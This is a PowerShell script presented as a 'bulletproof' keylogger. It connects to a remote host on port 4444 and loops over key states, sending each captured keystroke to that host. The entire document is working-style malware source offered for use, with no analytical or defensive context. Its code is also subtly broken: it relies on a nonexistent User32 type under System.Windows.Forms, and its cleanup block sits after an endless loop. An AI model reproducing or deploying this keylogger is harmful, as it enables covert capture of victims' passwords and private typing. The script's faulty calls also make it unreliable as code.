# Bulletproof PowerShell Keylogger
Add-Type -AssemblyName System.Windows.Forms

$targetIP = "192.168.8.199"
$targetPort = 4444

# --- Connection Block ---
Write-Host "Connecting to $targetIP`:$targetPort..." -ForegroundColor Yellow
$client = $null
$stream = $null
try {
    $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
    $stream = $client.GetStream()
    $startupMsg = "=== Keylogger Started ===`r`n"
    $stream.Write([System.Text.Encoding]::ASCII.GetBytes($startupMsg), 0, $startupMsg.Length)
    Write-Host "CONNECTED. Logging keys." -ForegroundColor Green
} catch {
    Write-Host "CONNECTION FAILED: $($_.Exception.Message)" -ForegroundColor Red
    if ($client -ne $null) { $client.Close() }
    return
}

# --- Keylogging Block ---
Write-Host "Press Ctrl+C to stop."
while ($true) {
    # Check for special keys first
    if ([System.Windows.Forms.User32]::GetAsyncKeyState(13)) {
        $keyData = "[ENTER]`r`n"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($keyData)
        $stream.Write($bytes, 0, $bytes.Length)
    }
    if ([System.Windows.Forms.User32]::GetAsyncKeyState(8)) {
        $keyData = "[BACKSPACE]`r`n"
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($keyData)
        $stream.Write($bytes, 0, $bytes.Length)
    }
    if ([System.Windows.Forms.User32]::GetAsyncKeyState(32)) {
        $keyData = " "
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($keyData)
        $stream.Write($bytes, 0, $bytes.Length)
    }

    # Check for alphanumeric keys (A-Z, 0-9)
    for ($i = 48; $i -le 57; $i++) { # 0-9
        if ([System.Windows.Forms.User32]::GetAsyncKeyState($i)) {
            $keyData = [char]$i
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($keyData)
            $stream.Write($bytes, 0, $bytes.Length)
        }
    }
    for ($i = 65; $i -le 90; $i++) { # A-Z
        if ([System.Windows.Forms.User32]::GetAsyncKeyState($i)) {
            # Check for SHIFT key to handle uppercase
            $isShift = [System.Windows.Forms.Control]::ModifierKeys -band [System.Windows.Forms.Keys]::Shift
            if ($isShift) {
                $keyData = [char]$i
            } else {
                $keyData = ([char]$i).ToString().ToLower()
            }
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($keyData)
            $stream.Write($bytes, 0, $bytes.Length)
        }
    }
    
    Start-Sleep -Milliseconds 50 # Prevent CPU spam
}

# --- Cleanup Block (runs when you press Ctrl+C) ---
if ($stream -ne $null) { $stream.Close() }
if ($client -ne $null) { $client.Close() }
Write-Host "Disconnected."
